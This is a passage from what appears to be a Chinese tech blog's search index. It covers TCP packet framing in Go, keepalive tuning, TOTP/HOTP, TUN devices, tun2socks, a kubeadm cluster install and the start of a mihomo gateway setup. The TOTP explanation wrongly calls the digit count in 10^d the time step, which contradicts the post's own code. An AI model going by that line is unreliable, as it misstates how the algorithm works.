在明白粘包和半包现象出现的根本原因后，我们就可以通过定义上层协议的边界来避免这种问题的出现。\n读取数据时将读到的数据放到缓冲区，再按照我们定义的协议对数据进行解析，这样就能避免我们读取时数据解析错误。\n代码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 package datagram import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/binary\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;io\u0026#34; ) type Parser struct { stream io.ReadWriteCloser } var ( HeaderSize = 6 HeaderFlag = uint16(0x0d0d) ) func NewParser(stream io.ReadWriteCloser) *Parser { return \u0026amp;Parser{stream: stream} } func (p *Parser) Pack(data []byte) error { buf := new(bytes.Buffer) // 写入包头 err := binary.Write(buf, binary.BigEndian, HeaderFlag) if err != nil { return err } // 写入包长度 err = binary.Write(buf, binary.BigEndian, uint32(len(data))) if err != nil { return err } // 写入原始数据 _, err = buf.Write(data) if err != nil { return err } // 写入流 _, err = p.stream.Write(buf.Bytes()) if err != nil { return err } return nil } func (p *Parser) Unpack() ([]byte, error) { header := make([]byte, HeaderSize) // 读取包头 _, err := io.ReadFull(p.stream, header) if err != nil { return nil, err } flag := binary.BigEndian.Uint16(header[:2]) if flag != HeaderFlag { return nil, errors.New(\u0026#34;unknown packet\u0026#34;) } // 解析包长度 packetSize := binary.BigEndian.Uint32(header[2:]) // 读取包数据 packetData := make([]byte, packetSize) _, err = io.ReadFull(p.stream, packetData) if err != nil { return nil, err } return packetData, nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tcp-%E7%B2%98%E5%8C%85%E9%97%AE%E9%A2%98/","title":"TCP 粘包问题"},{"content":"TCP 长连接 TCP 短连接 使用 TCP 传输数据时，每一次传输都打开一个 socket ，当次数据传输完后就关闭这个 socket。\n由于每次打开 socket、关闭 socket 时就会经历 TCP 的三次握手和四次挥手流程，这些流程会消耗大量时间。\nTCP 长连接 如果能够单次传输完成后不关闭 socket，后续传输数据时，可以复用同一个 socket，那么就会节省下大量的 TCP 握手和挥手的时间。\nTCP 中的 Keep-Alive 机制就实现了上诉需求。\nLinux 端可通过 sysctl -a | grep keepalive 命令查看内核的 tcp_keepalive 相关参数：\n1 2 3 4 root@ubuntu:~# sysctl -a |grep keepalive net.ipv4.tcp_keepalive_intvl = 75\t# 当没有收到对方的确认时，继续发送保活探测报文的间隔时间 net.ipv4.tcp_keepalive_probes = 9\t# 当没有收到对方的确认时，继续发送保活探测报文的默认次数 net.ipv4.tcp_keepalive_time = 7200\t# 最后一次数据传输结束开始计时起到发送第一个保活探测报文的时间间隔 当开启 TCP 的 Keep-Alive 机制后，TCP socket 连接会定期向对端发送心跳保活包。超过 7200s 没有进行收发数据后，TCP socket 向对端发送保活包时，对端有可能处于以下三种状态：\n对方成功接收，连接正常：以期望的ACK报文段响应；本地 socket 等待 7200s 后又会发送保活包； 对方已崩溃且已重新启动：回复 RST 报文响应。本地 socket 的待处理错误被置为 ECONNRESET，socket本身则被关闭，断开TCP连接； 对方无任何响应：发送保活探测报文的一方，相隔 75s 后，再次重发保活探测报文，重发8次，一共尝试9次。若仍无响应就放弃。socket的待处理错误被置为ETIMEOUT，socket本身则被关闭，断开TCP连接。 其他系统上 keepalive 的默认设置：\nFreeBSD、Mac OS X系统：\n1 2 3 4 $ sysctl net.inet.tcp | grep -E \u0026#34;keepidle|keepintvl|keepcnt\u0026#34; net.inet.tcp.keepidle: 7200000 net.inet.tcp.keepintvl: 75000 net.inet.tcp.keepcnt: 8 Windows 系统：官方文档\nRegistry entry Format Windows Vista® and Windows Server® 2008 default setting Recommended setting DisableIPSourceRouting DWORD 1 for IPv4, 0 for IPv6 2 KeepAliveTime DWORD 7,200,000 (time in milliseconds) 300,000 (time in milliseconds) PerformRouterDiscovery DWORD 2 0 TcpMaxDataRetransmissions DWORD 5 3 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tcp-%E9%95%BF%E8%BF%9E%E6%8E%A5/","title":"TCP 长连接"},{"content":"MFA 和 动态令牌（OTP、HOTP、TOTP） 多重要素验证（英语：Multi-factor authentication，缩写为 MFA），又译多因子认证、多因素验证、多因素认证，是一种电脑存取控制的方法，用户要通过两种以上的认证机制之后，才能得到授权。\nOTP、HOTP、TOTP都是 MFA 中常用的手段。\nOTP 一次性密码（英语：one-time password，简称OTP），又称动态密码或单次有效密码，是指计算机系统或其他数字设备上只能使用一次的密码，有效期为只有一次登录会话或交易。\nHOTP 基于HMAC的一次性密码算法（英语：HMAC-based One-time Password algorithm，HOTP）是一种基于散列消息验证码（HMAC）的一次性密码（OTP）算法，同时也是开放验证提案的基础（OATH）。\nHOTP算法的基本原理如下：\n确定一个密钥K和计数器C，其中K是一个共享的密钥，而C是一个递增的计数器，每个用户在使用HOTP算法时都有自己的K和C； 通过HMAC-SHA算法，将K和C结合起来生成一个哈希值H，其中SHA是一种安全哈希算法； 从哈希值H中提取出一个动态密码，通常是取H的末尾几位，并对这个密码进行模运算，得到一个固定长度的数字密码； 将这个数字密码发送给用户，用户输入该数字密码进行身份验证。 由于 HOTP 会依赖于计数器，当用户无意间生成密码，但是又没有使用时，会导致服务端和客户端不同步，这会导致服务端和客户端验证不通过。一般可以采用计算器窗口来解决这个问题。\n计数器窗口定义了允许的计数器值范围，客户端和服务器之间的计数器值只需要在该窗口范围内即可被接受。这样，即使客户端和服务器之间存在一定程度的计数器不同步，也可以通过计数器窗口来容忍。\n但是如果客户端和服务器之间计数器不同步的差距超过了计数器窗口，那么就需要对客户端和服务端的计数器进行重置来解决这个问题。\nTOTP 基于时间的一次性密码算法（英语：Time-based One-Time Password，简称：TOTP）是一种根据预共享的密钥与当前时间计算一次性密码的算法。\nTOTP是散列消息认证码（HMAC）当中的一个例子。它结合一个私钥与当前时间戳，使用一个密码散列函数来生成一次性密码。由于网络延迟与时钟不同步可能导致密码接收者不得不尝试多次遇到正确的时间来进行身份验证，时间戳通常以30秒为间隔，从而避免反复尝试。\nTOTP算法的原理如下：\n客户端和服务器共享一个密钥K； 客户端根据当前时间生成时间戳T，并将T和密钥K作为输入，使用HMAC-SHA算法计算哈希值； 将哈希值截取为4个字节，得到一个32位的整数； 将32位整数对10^d取模，d是TOTP算法中的时间步长，通常为30秒； 将结果补齐为一个固定长度的字符串，例如6位数的动态密码； 将动态密码发送给服务器进行验证。 下面是用 Go 实现的 TOTP Demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package main import ( \u0026#34;crypto/hmac\u0026#34; \u0026#34;crypto/sha1\u0026#34; \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func generateHOTP(secret []byte, counter uint64, digits int) uint32 { // Convert the counter to byte array message := make([]byte, 8) binary.BigEndian.PutUint64(message, counter) // Calculate the HMAC-SHA1 key := hmac.New(sha1.New, secret) key.Write(message) hash := key.Sum(nil) // Generate the one-time password offset := hash[len(hash)-1] \u0026amp; 0x0f code := (uint32(hash[offset])\u0026amp;0x7f)\u0026lt;\u0026lt;24 | (uint32(hash[offset+1])\u0026amp;0xff)\u0026lt;\u0026lt;16 | (uint32(hash[offset+2])\u0026amp;0xff)\u0026lt;\u0026lt;8 | (uint32(hash[offset+3]) \u0026amp; 0xff) // Truncate the password to the desired number of digits mod := uint32(1) for i := 0; i \u0026lt; digits; i++ { mod *= 10 } code = code % mod return code } func main() { // Example secret key and counter secret := []byte(\u0026#34;mysecretkey\u0026#34;) counter := uint64(time.Now().Unix() / 30) // Generate the one-time password with 6 digits otp := generateHOTP(secret, counter, 6) // Print the result fmt.Printf(\u0026#34;One-Time Password: %06d\\n\u0026#34;, otp) } Google 验证器 Google 开源了一个 Google Authenticator APP，这个 APP 支持生成 HOTP 和 TOTP。我们可以使用 Google 验证器帮助我们使用 HOTP 和 TOTP技术。\n用户可以在 Google Authenticator 里手动录入 HOTP 和 TOTP 中的 secret，更方便的做法是把密钥转成二维码。Google Authenticator 支持的二维码格式是：\n1 otpauth://TYPE/LABEL?PARAMETERS TYPE 支持 hotp 或 totp；LABEL 用来指定用户身份，例如用户名、邮箱或者手机号，前面还可以加上服务提供者，需要做 URI 编码。它是给人看的，不影响最终校验码的生成。\nPARAMETERS 用来指定参数，它的格式与 URL 的 Query 部分一样，也是由多对 key 和 value 组成，也需要做 URL 编码。可指定的参数有这些：\nsecret：必须，密钥 K，需要编码为 base32 格式； algorithm：可选，HMAC 的哈希算法，默认 SHA1。Google Authenticator 不支持这个参数； digits：可选，校验码长度，6 位或 8 位，默认 6 位。Google Authenticator 不支持这个参数； counter：可选，指定 HOTP 算法中，计数器 C 的默认值，默认 0； period：可选，指定 TOTP 算法中的间隔时间 TS，默认 30 秒。Google Authenticator 不支持这个参数； issuer：可选（强烈推荐），指定服务提供者。这个字段会在 Google Authenticator 客户端中单独显示，在添加了多个服务者提供的 2FA 后特别有用。 另外，Google Authenticator 也不支持指定 TOTP 算法中起始时间戳 T0。下面是两个完整的例子，将他们生成二维码，通过 Google Authenticator 扫描就可以添加进去了：\notpauth://hotp/TEST:example@mail.com?secret=IBED6ZJDF4UWST3YKM3DK2ZQHFUDQZZSIRFD6L2FMF3FEN2DINZQ\u0026amp;issuer=ququblog\u0026amp;counter=0 otpauth://totp/TEST:example@mail.com?secret=IBED6ZJDF4UWST3YKM3DK2ZQHFUDQZZSIRFD6L2FMF3FEN2DINZQ\u0026amp;issuer=ququblog 有关 Google Authenticator 二维码格式的更多说明，可以参考官方 wiki。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/totp%E5%92%8Chotp%E5%8E%9F%E7%90%86/","title":"TOTP和HOTP原理"},{"content":"tracert 原理 tracert 是 Windows 端一个用于路由追踪的程序。\n例如我们想看我们到 baidu.com 之间经过了哪些路由，就可以在 Windows 的 Terminal 执行：\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tracert-%E5%8E%9F%E7%90%86/","title":"tracert 原理"},{"content":"TUN IFF_MULTI_QUEUE 使用 https://blog.cloudflare.com/virtual-networking-101-understanding-tap/\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tun-iff_multi_queue/","title":"TUN IFF_MULTI_QUEUE"},{"content":"Tun 网卡创建 在 Linux 2.4 及其以后的版本中，有一种名为tun的特殊虚拟网络设备。用户可以直接创建虚拟网卡tun，并通过文件读写方式从该设备处读取到网络层数据包（IP 数据包）。\n使用该虚拟网卡，用户可像配置真实网卡一样设置 IP 地址、配置路由信息并进行数据读写操作。这些数据读写操作需要借助用户编写的程序来完成。\n使用 TUN/TAP 进行读取和写入，与数据报套接字上的读取和写入非常相似，必须针对完整的数据包。如果读入的缓冲区太小而无法容纳完整的数据包，则缓冲区将被填满，数据包的其余部分将被丢弃。对于写入，如果写入部分数据包，驱动程序将认为这是一个完整的数据包，并通过隧道设备传递截断的数据包。\nLinux 环境 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) func main() { tun, err := CreateTUN(\u0026#34;tun0\u0026#34;) if err != nil { return } // read data from tun buff := make([]byte, 1500) n, err := tun.Read(buff) if err != nil { panic(err) } // write data to tun _, err = tun.Write(buff[:n]) if err != nil { panic(err) } } const ( cloneDevicePath = \u0026#34;/dev/net/tun\u0026#34; ) func CreateTUN(name string) (*os.File, error) { // open the clone device path tfd, err := unix.Open(cloneDevicePath, unix.O_RDWR|unix.O_CLOEXEC, 0) if err != nil { if os.IsNotExist(err) { return nil, fmt.Errorf(\u0026#34;CreateTUN(%q) failed; %s does not exist\u0026#34;, name, cloneDevicePath) } return nil, err } // create a new Ifreq instance for the specified device name ifreq, err := unix.NewIfreq(name) if err != nil { return nil, err } // unix.IFF_TUN: TUN device // unix.IFF_NO_PI: no need to provide package information ifreq.SetUint16(unix.IFF_TUN | unix.IFF_NO_PI) err = unix.IoctlIfreq(tfd, unix.TUNSETIFF, ifreq) if err != nil { return nil, err } // set the current file descriptor to non-blocking status to improve concurrency err = unix.SetNonblock(tfd, true) if err != nil { return nil, err } // Create a new os.File object representing the created TUN device. file := os.NewFile(uintptr(tfd), cloneDevicePath) return file, nil } 上面的代码中，创建出来的 *os.File 对象就是一个 tun 网卡实例，可以对其进行读写操作。\nWindows 环境 Windows 环境下创建 TUN 网卡需要用到一个驱动程序: wintun.dll。这个驱动程序是由 WireGuard 团队编写并开源的，官网地址：https://www.wintun.net/。\nWindows接口驱动的开发和安装通常比较复杂，需要使用一些常见的驱动安装包，如：.inf文件、.sys文件和.cat文件。此外，在安装过程中还必须进行驱动程序签名，否则无法成功安装。在开发和调试阶段，每次都需要进行签名，这个过程可能会显得繁琐。\n但是 wintun.dll 接口用法非常简单高效：\n引入头文件：wintun.h 加载动态库，解析动态库中的函数指针 它提供了一种基于动态库的接口方式，我们可以加载该动态库并调用其中的函数指针来创建、销毁和收发虚拟接口数据包等操作。\nWireGuard 官方提供了 golang.zx2c4.com/wintun 库，该库已经对 wintun.dll 进行了封装，直接调用该库即可在 Windows 上创建 TUN 网卡：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import ( \u0026#34;golang.org/x/sys/windows\u0026#34; \u0026#34;golang.zx2c4.com/wintun\u0026#34; ) func main() { tun, err := CreateTUN(\u0026#34;tun0\u0026#34;) if err != nil { return } // read data from tun packet, err := tun.ReceivePacket() if err != nil { panic(err) } // write data to tun tun.SendPacket(packet) } func CreateTUN(name string) (*wintun.Session, error) { // generate a new GUID guid, err := windows.GenerateGUID() if err != nil { return nil, err } // create a Wintun adapter with the specified name and description wt, err := wintun.CreateAdapter(name, \u0026#34;TUNDemo\u0026#34;, \u0026amp;guid) // start a new Wintun session with a ring capacity of 8 MiB session, err := wt.StartSession(0x800000) if err != nil { return nil, err } // return a pointer to the session return \u0026amp;session, nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tun-%E7%BD%91%E5%8D%A1%E5%88%9B%E5%BB%BA/","title":"Tun 网卡创建"},{"content":"tun2socks 原理分析 简介 tun 是一种位于 网络层 的虚拟网卡，从 tun 读取和写入的数据都是 网络层的数据。而 Socks 是一种使用 Socket 代理的技术，代理的是会话层的流量。\n因此想要将从 tun 出来的流量塞到 socks 代理，就需要去除 网络层和 传输层的 Header；而想要将 Socks 回来的数据塞到 Tun，则需要在流量前面增加 网络层 和 传输层的 Header。\n下面介绍两种市面上使用较多的方案。\n系统网络栈 在启用 tun 网卡时，同时监听一个对应传输层协议的 socket。当从 tun 网卡读取到网络包后，改变网络包的四元组（源IP改为 tun 网卡 IP，源端口更换为一个随机端口，目的 IP 和 目的端口改为监听的 Socket 的IP和端口），再将网络包写回 tun 网卡。\n当网络包写回系统网络栈后，系统会自行转发包到监听的 socket，从监听的 socket 中读取的数据就是已经去除了 网络层和传输层 header 的数据。\n要注意的是，在发送数据包的过程中需要记忆改变前后的四元组（NAT 映射）。当 socket 返回数据时，从 tun 网卡读取数据，再改变回原始的映射关系。\n这样就利用系统网络栈实现了 tun2socks。\ngVisor 协议栈 gVisor 是谷歌开发实现的容器沙箱。在 gVisor 中实现了一套较为完整的网络协议栈。\ngVisor中提供了不同层网络协议包的解析以及读取，因此我们可以利用 gVisor 对 网络包解析来实现 tun2socks。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/tun2socks-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","title":"tun2socks 原理分析"},{"content":"环境配置 该部分配置所有节点都需要执行！ 关闭防火墙 1 2 3 4 5 root@k8s:~# ufw status Status: inactive # 关闭防火墙 ufw disable 关闭 swap 由于 swap 在涉及交换内存时，保证和核算 Pod 内存利用率存在固有的困难。因此 k8s 需要禁用 Linux 的 swap 功能（1.22 以后 k8s 在逐步支持，不过当前还不够完善）。\n1 2 3 4 5 6 7 # 临时关闭 swapoff -a # 永久关闭 vim /etc/fstab （注释fstab中swap配置） # 或者直接使用 sed sed -ri \u0026#39;s/.*swap.*/#\u0026amp;/\u0026#39; /etc/fstab 关闭 SELinux 1 2 3 4 5 6 7 8 # 查看是否开启 SELinux # 某些ubuntu版本，没有安装selinux，则可以不用配置 getenforce # 临时关闭 SELinux setenforce 0 # 永久关闭 SELinux sed -i \u0026#39;s/^SELINUX=.*/SELINUX=disabled/\u0026#39; /etc/selinux/config 开启内核流量转发并让 iptables 看到桥接流量 1 2 3 4 5 6 7 8 # 载入内核模块 tee /etc/modules-load.d/k8s.conf \u0026lt;\u0026lt;EOF overlay br_netfilter EOF modprobe overlay modprobe br_netfilter 1 2 3 4 5 6 7 # 开启 bridge 流量过滤和内核流量转发功能 tee /etc/sysctl.d/k8s.conf \u0026lt;\u0026lt; EOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 net.ipv6.conf.all.forwarding = 1 EOF 1 2 # 应用配置而不重新启动 sysctl --system 1 2 3 4 5 6 # 查看相关内核模块是否载入 lsmod | grep br_netfilter lsmod | grep overlay # 查看内核参数是否修改 sysctl net.bridge.bridge-nf-call-iptables net.bridge.bridge-nf-call-ip6tables net.ipv4.ip_forward net.ipv6.conf.all.forwarding 安装容器运行时 k8s 官方推介 containerd 作为 k8s 的容器运行时。因此下面在集群中安装 containerd。 下面介绍使用 apt-get 的方式在环境中安装 containerd，其余平台和环境安装 containerd 可见: https://github.com/containerd/containerd/blob/main/docs/getting-started.md\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Add Docker\u0026#39;s official GPG key: sudo apt-get update sudo apt-get install ca-certificates curl sudo install -m 0755 -d /etc/apt/keyrings sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc sudo chmod a+r /etc/apt/keyrings/docker.asc # Add the repository to Apt sources: echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\ $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;${UBUNTU_CODENAME:-$VERSION_CODENAME}\u0026#34;) stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null sudo apt-get update # install containerd.io sudo apt-get install containerd.io 1 2 # 查看 containerd 状态 systemctl status containerd 配置 containerd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 生成默认配置 containerd config default \u0026gt; /etc/containerd/config.toml # 如果提示：/etc/containerd/config.toml: No such file or directory # 则需要手动创建文件夹再执行上面的命令 mkdir /etc/containerd/ # k8s 官方推荐使用 systemd 作为 CgroupDriver # 修改 CgroupDriver 为 systemd sed -i \u0026#39;s/SystemdCgroup \\= false/SystemdCgroup \\= true/g\u0026#39; /etc/containerd/config.toml # 查看是否修改成功 root@k8s:~# cat /etc/containerd/config.toml | grep SystemdCgroup SystemdCgroup = true # 由于网络原因，国内很难拉取 registry.k8s.io/pause:3.8 镜像 # 这个镜像是一切的pod的基础，要么自己手动导入进来，要么改成国内的镜像 # 下面将 containerd 的镜像仓库更换为阿里云的源 sed -i \u0026#39;s/sandbox_image = \u0026#34;.*\u0026#34;/sandbox_image = \u0026#34;registry.aliyuncs.com\\/google_containers\\/pause:3.10\u0026#34;/\u0026#39; /etc/containerd/config.toml # 查看是否修改成功 root@k8s:~# cat /etc/containerd/config.toml | grep sandbox_image sandbox_image = \u0026#34;registry.aliyuncs.com/google_containers/pause:3.10\u0026#34; # 重启 containerd systemctl restart containerd # 查看 containerd 状态 systemctl status containerd 安装 kubeadm、kubelet 和 kubectl 添加 k8s 软件源 此部分所有节点都需要执行！ 详细可见：https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n1 2 3 sudo apt-get update # apt-transport-https 可能是一个虚拟包（dummy package）；如果是的话，你可以跳过安装这个包 sudo apt-get install -y apt-transport-https ca-certificates curl gpg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 对于国内机器，推介更换阿里源 curl -fsSL https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.33/deb/Release.key | gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg echo \u0026#34;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.33/deb/ /\u0026#34; | tee /etc/apt/sources.list.d/kubernetes.list # 如果是网络环境能够访问外网，则可以使用官方方式 # 下载签名秘钥及添加apt仓库 # 如果 `/etc/apt/keyrings` 目录不存在，则应在 curl 命令之前创建它，请阅读下面的注释。 # sudo mkdir -p -m 755 /etc/apt/keyrings curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.33/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg # 此操作会覆盖 /etc/apt/sources.list.d/kubernetes.list 中现存的所有配置。 echo \u0026#39;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.33/deb/ /\u0026#39; | sudo tee /etc/apt/sources.list.d/kubernetes.list 安装配置 k8s master 节点 更新 apt 包索引，安装 kubelet、kubeadm 和 kubectl，并锁定其版本：\n1 2 3 sudo apt-get update sudo apt-get install -y kubelet kubeadm kubectl sudo apt-mark hold kubelet kubeadm kubectl 用 kubeadm 初始化集群：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 初始化集群控制台 Control plane # 失败了可以用 kubeadm reset 重置 # 对于国内机器建议更换镜像源为阿里源 # 注意⚠️：此处指定 pod-network-cidr 为 10.244.0.0/16 # 这是为了与后面的 flannel 匹配，如无特殊需求直接使用这个即可 # apiserver-advertise-address 用于指定 k8s apiserver 监听地址，默认会使用默认网卡的 IP # 由于我这里是多网卡，需要更换为实际网卡地址 kubeadm init --image-repository=registry.aliyuncs.com/google_containers --pod-network-cidr=10.244.0.0/16 --apiserver-advertise-address=\u0026#34;192.168.5.51\u0026#34; # 记得把 kubeadm join xxx 保存起来 你需要此命令将节点加入集群。 # 忘记了重新获取：kubeadm token create --print-join-command #要使非 root 用户可以运行 kubectl，请运行以下命令， 它们也是 kubeadm init 输出的一部分： mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config 状态检查：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 # 检查集群状态 root@k8s:~# kubectl get --raw=\u0026#39;/readyz?verbose\u0026#39; [+]ping ok [+]log ok [+]etcd ok [+]etcd-readiness ok [+]informer-sync ok [+]poststarthook/start-apiserver-admission-initializer ok [+]poststarthook/generic-apiserver-start-informers ok [+]poststarthook/priority-and-fairness-config-consumer ok [+]poststarthook/priority-and-fairness-filter ok [+]poststarthook/storage-object-count-tracker-hook ok [+]poststarthook/start-apiextensions-informers ok [+]poststarthook/start-apiextensions-controllers ok [+]poststarthook/crd-informer-synced ok [+]poststarthook/start-system-namespaces-controller ok [+]poststarthook/start-cluster-authentication-info-controller ok [+]poststarthook/start-kube-apiserver-identity-lease-controller ok [+]poststarthook/start-kube-apiserver-identity-lease-garbage-collector ok [+]poststarthook/start-legacy-token-tracking-controller ok [+]poststarthook/start-service-ip-repair-controllers ok [+]poststarthook/rbac/bootstrap-roles ok [+]poststarthook/scheduling/bootstrap-system-priority-classes ok [+]poststarthook/priority-and-fairness-config-producer ok [+]poststarthook/bootstrap-controller ok [+]poststarthook/start-kubernetes-service-cidr-controller ok [+]poststarthook/aggregator-reload-proxy-client-cert ok [+]poststarthook/start-kube-aggregator-informers ok [+]poststarthook/apiservice-status-local-available-controller ok [+]poststarthook/apiservice-status-remote-available-controller ok [+]poststarthook/apiservice-registration-controller ok [+]poststarthook/apiservice-discovery-controller ok [+]poststarthook/kube-apiserver-autoregistration ok [+]autoregister-completion ok [+]poststarthook/apiservice-openapi-controller ok [+]poststarthook/apiservice-openapiv3-controller ok [+]shutdown ok readyz check passed # 查看 namespace root@k8s:~# kubectl get ns NAME STATUS AGE default Active 5m3s kube-node-lease Active 5m3s kube-public Active 5m3s kube-system Active 5m4s # 查看 kube-system 空间 pod 状态 root@k8s:~# kubectl get pods -n kube-system NAME READY STATUS RESTARTS AGE coredns-757cc6c8f8-cpv64 0/1 Pending 0 4m56s coredns-757cc6c8f8-h697j 0/1 Pending 0 4m56s etcd-k8s 1/1 Running 0 5m1s kube-apiserver-k8s 1/1 Running 0 5m7s kube-controller-manager-k8s 1/1 Running 0 5m1s kube-proxy-hdf6r 1/1 Running 0 4m56s kube-scheduler-k8s 1/1 Running 0 5m7s # 查看节点状态 root@k8s:~# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s NotReady control-plane 14m v1.33.1 在 master node上执行 kubectl get nodes 发现状态是 NotReady，这是因为还没有部署 CNI 网络插件。在 k8s 系统上 Pod 网络的实现依赖于第三方插件进行，这类插件有近数十种之多，较为著名的有 flannel、calico 和 Cilium 等。\n其中 flannel 相对来说较为简单，对于初学者来说可以应用 flannel 来部署 CNI 网络插件。\nflannel 部署：\n注意⚠️：kube-flannel.yml 的 Network，要和 pod-network-cidr 保持一致 如果在初始化时使用的是 --pod-network-cidr=10.244.0.0/16 则不用进行修改了，否则需要自行修改 kube-flannel.yaml 查看 k8s pod-network-cidr:\n1 2 root@k8s:~# kubectl get node -o jsonpath=\u0026#39;{.items[0].spec.podCIDR}\u0026#39; 10.244.0.0/24 kube-flannel.yml:\n1 2 3 4 5 6 7 8 net-conf.json: | { \u0026#34;Network\u0026#34;: \u0026#34;10.244.0.0/16\u0026#34;, \u0026lt;- 修改此处 \u0026#34;EnableNFTables\u0026#34;: false, \u0026#34;Backend\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;vxlan\u0026#34; } } 配置对应后即可部署 `flannel`： ```bash # 部署 flannel root@k8s:~# kubectl apply -f https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml namespace/kube-flannel created serviceaccount/flannel created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created # 查看 flannel 节点状态 root@k8s:~# kubectl get pods -n kube-flannel NAME READY STATUS RESTARTS AGE kube-flannel-ds-v92h4 1/1 Running 0 22s slave 节点 注意⚠️：此部分需要在所有 slave 节点执行！ 1 2 3 4 5 6 7 8 # slave 节点不需要安装 kubectl，只需要安装 kubelet 和 kubeadm 即可 sudo apt-get install -y kubelet kubeadm sudo apt-mark hold kubelet kubeadm # 执行 master 节点在 init 时输出的 kubeadm join xxx 命令 # 如果忘记命令，可在 master 节点输出 kubeadm token create --print-join-command 命令查看 # 如果 kubeadm 输出的命令的 IP 和实际联通 IP 符的，可自行修改 kubeadm join xxxx... 最后 回到 master 节点，查看集群状态：\n1 2 3 4 5 6 # 查看节点状态 root@k8s:~# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s Ready control-plane 96m v1.33.1 node1 Ready \u0026lt;none\u0026gt; 95m v1.33.1 node2 Ready \u0026lt;none\u0026gt; 94m v1.33.1 所以节点都处于 Ready 状态，说明 k8s 集群已经安装配置好了。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ubuntu-%E5%AE%89%E8%A3%85-k8s-%E9%9B%86%E7%BE%A4/","title":"Ubuntu 安装 k8s 集群"},{"content":"Ubuntu 运行 clash 并作为旁路网关 开启网络转发 1 2 3 4 5 # 开启 ip_forward 转发 sysctl net.ipv4.ip_forward=1 # 保存设置 sysctl -p 安装 clash(mihomo) 去 Github 下载 mihomo 二进制文件：https://github.com/MetaCubeX/mihomo/releases\n将二进制文件重命名为 mihomo\n1 2 3 4 5 6 7 8 9 10 11 # 赋予 mihomo 执行权限 chmod +x mihomo # 将 mihomo 放置到 /usr/local/bin 下 cp mihomo /usr/local/bin # 创建运行目录 mkdir /etc/mihomo -p # 将自己的配置文件复制到 /etc/mihomo cp config.yaml /etc/mihomo 在以服务形式执行之前，先尝试手动运行：\n1 /usr/local/bin/mihomo -d /etc/mihomo 如果手动运行没有问题，则可以创建系统服务。创建 systemd 配置文件 /etc/systemd/system/mihomo.service:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [Unit] Description=mihomo Daemon, Another Clash Kernel. After=network.target NetworkManager.service systemd-networkd.service iwd.service [Service] Type=simple LimitNPROC=500 LimitNOFILE=1000000 CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH 